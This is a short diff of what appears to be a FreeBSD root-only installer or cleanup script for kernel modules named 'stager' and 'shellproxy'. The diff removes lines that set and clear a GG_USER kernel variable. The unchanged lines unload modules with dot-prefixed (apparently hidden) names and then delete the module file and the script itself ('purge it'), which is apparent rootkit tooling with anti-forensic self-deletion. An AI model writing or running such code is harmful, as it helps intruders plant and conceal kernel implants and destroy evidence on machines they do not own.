@@ -8,12 +8,6 @@ if [ "$(id -u)" != "0" ]; then
 	exit 1
 fi
 
-if [ -n "${1:-}" ]; then
-	/bin/kenv GG_USER="$1"
-else
-	/bin/kenv -q -u GG_USER >/dev/null 2>&1 || true
-fi
-
 kldunload stager >/dev/null 2>&1 || true
 kldunload -n shellproxy >/dev/null 2>&1 || true
 for m in $(kldstat 2>/dev/null | awk '$5 ~ /^\./ {print $5}'); do
@@ -46,8 +40,6 @@ if kldstat -m stager >/dev/null 2>&1; then
 	echo "[install] stager unload fail" >&2
 	exit 1
 fi
-
-/bin/kenv -q -u GG_USER >/dev/null 2>&1 || true
 
 # purge it
 rm -f stager.ko "$0"
